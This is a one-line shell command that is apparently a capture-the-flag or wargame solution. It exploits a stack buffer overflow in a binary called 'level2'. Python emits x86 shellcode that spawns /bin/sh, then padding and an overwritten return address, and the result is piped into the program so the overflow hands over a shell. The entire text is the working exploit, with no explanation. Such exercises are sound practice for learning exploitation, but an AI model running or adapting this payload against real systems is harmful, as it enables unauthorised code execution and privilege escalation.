python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A" * 57 + "\x08\xa0\x04\x08")' > /tmp/level2.txt; cat /tmp/level2.txt - | ./level2
